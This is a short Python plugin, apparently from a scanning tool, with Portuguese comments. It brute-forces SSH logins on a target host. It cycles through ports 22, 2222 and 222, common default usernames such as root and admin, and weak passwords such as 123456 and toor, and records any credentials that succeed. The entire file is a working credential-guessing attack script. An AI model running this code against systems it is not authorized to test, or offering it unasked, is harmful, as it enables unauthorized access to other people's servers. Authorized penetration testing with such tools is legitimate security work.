# plugins/ssh_brute.py
def run(target, results):
    """
    Tenta brute force SSH em portas padrão e comuns.
    Necessita: pip install paramiko
    """
    import paramiko
    import socket

    portas = [22, 2222, 222]  # SSH padrões e variantes
    usuarios = ["root", "admin", "ubuntu", "user"]
    senhas = ["admin", "123456", "password", "toor", "ubuntu", "root", "admin123"]

    encontrados = []
    for porta in portas:
        for user in usuarios:
            for senha in senhas:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        target,
                        port=porta,
                        username=user,
                        password=senha,
                        timeout=5,
                        allow_agent=False,
                        look_for_keys=False
                    )
                    encontrados.append({
                        "porta": porta,
                        "usuario": user,
                        "senha": senha
                    })
                    client.close()
                except (paramiko.AuthenticationException, paramiko.ssh_exception.SSHException, socket.error):
                    continue
                except Exception as e:
                    # Guarda outros erros para análise posterior, sem travar o loop
                    encontrados.append({"porta": porta, "usuario": user, "erro": str(e)})

    results["ssh_brute"] = encontrados if encontrados else "Nenhum acesso SSH padrão identificado"
